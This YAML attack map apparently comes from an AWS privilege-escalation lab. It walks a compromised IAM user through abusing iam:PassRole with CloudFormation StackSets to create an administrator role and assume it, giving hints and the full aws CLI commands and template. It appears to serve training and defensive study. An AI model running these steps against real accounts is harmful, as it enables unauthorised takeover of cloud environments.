attackMap:
  nodes:
    - id: starting-user
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-cloudformation-003-to-admin-starting-user"
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole on the privileged execution role, cloudformation:CreateStackSet,
        and cloudformation:CreateStackInstances permissions. These combined permissions allow you to
        deploy a CloudFormation StackSet that creates IAM resources with any permissions you define.

    - id: stackset
      label: "CloudFormation StackSet"
      type: resource
      subType: cloudformation-stack
      arn: "arn:aws:cloudformation:{region}:{account_id}:stackset/pl-prod-cloudformation-003-escalation-stackset:*"
      description: >
        A CloudFormation StackSet you create using the starting user's permissions. The StackSet is
        configured to use the privileged execution role (passed via iam:PassRole) to perform resource
        creation. When you deploy a stack instance from this StackSet, CloudFormation assumes the
        execution role and creates the IAM resources defined in your template.

    - id: escalated-role
      label: "Escalated Admin Role"
      type: principal
      subType: iam-role
      isTarget: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-cloudformation-003-to-admin-escalated-role"
      description: >
        An IAM role created by the CloudFormation StackSet using the privileged execution role's permissions.
        The template you provided defines this role with AdministratorAccess and a trust policy allowing
        the starting user to assume it. Once the stack instance completes successfully, you can assume
        this role to gain full administrative access to the AWS account.

  edges:
    - from: starting-user
      to: stackset
      label: "iam:PassRole + cloudformation:CreateStackSet + cloudformation:CreateStackInstances"
      description: >
        Create a CloudFormation StackSet passing the privileged execution role, then deploy a stack
        instance. CloudFormation assumes the execution role and creates the IAM resources defined in
        the template, including the escalated admin role.
      hints:
        - "You have permissions related to CloudFormation and IAM role passing."
        - "CloudFormation StackSets can create resources in an account using an execution role — look at what roles you can pass."
        - "Create a StackSet with a template that defines an admin IAM role, passing the privileged execution role to perform the deployment."
        - "Browse to https://pathfinding.cloud/paths/cloudformation-003 for technique details."
      commands:
        - description: "Create a CloudFormation template defining an escalated admin role"
          command: |
            cat > /tmp/escalation-template.json << 'EOF'
            {
              "AWSTemplateFormatVersion": "2010-09-09",
              "Resources": {
                "EscalatedRole": {
                  "Type": "AWS::IAM::Role",
                  "Properties": {
                    "RoleName": "pl-prod-cloudformation-003-to-admin-escalated-role",
                    "AssumeRolePolicyDocument": {
                      "Version": "2012-10-17",
                      "Statement": [{"Effect": "Allow", "Principal": {"AWS": "arn:aws:iam::ACCOUNT_ID:user/pl-prod-cloudformation-003-to-admin-starting-user"}, "Action": "sts:AssumeRole"}]
                    },
                    "ManagedPolicyArns": ["arn:aws:iam::aws:policy/AdministratorAccess"]
                  }
                }
              }
            }
            EOF
        - description: "Create the StackSet passing the privileged execution role"
          command: "aws cloudformation create-stack-set --stack-set-name pl-cf003-escalation --template-body file:///tmp/escalation-template.json --execution-role-name pl-prod-cloudformation-003-to-admin-execution-role --administration-role-arn arn:aws:iam::ACCOUNT_ID:role/AWSCloudFormationStackSetAdministrationRole"
        - description: "Deploy a stack instance to create the escalated role"
          command: "aws cloudformation create-stack-instances --stack-set-name pl-cf003-escalation --accounts ACCOUNT_ID --regions us-east-1 --operation-preferences FailureToleranceCount=0,MaxConcurrentCount=1"
        - description: "Wait for the stack instance operation to complete"
          command: "aws cloudformation describe-stack-set-operation --stack-set-name pl-cf003-escalation --operation-id OPERATION_ID"

    - from: stackset
      to: escalated-role
      label: "sts:AssumeRole"
      description: >
        Once the StackSet operation completes, assume the newly created escalated role to gain
        full administrative access to the AWS account.
      hints:
        - "The StackSet uses the execution role you passed to create resources — what IAM resources could you have it create?"
        - "Define a CloudFormation template that creates an IAM role with AdministratorAccess and a trust policy allowing your starting user to assume it."
      commands:
        - description: "Assume the escalated admin role"
          command: "aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_ID:role/pl-prod-cloudformation-003-to-admin-escalated-role --role-session-name escalation-session"
        - description: "Verify administrative access"
          command: "aws iam list-users"
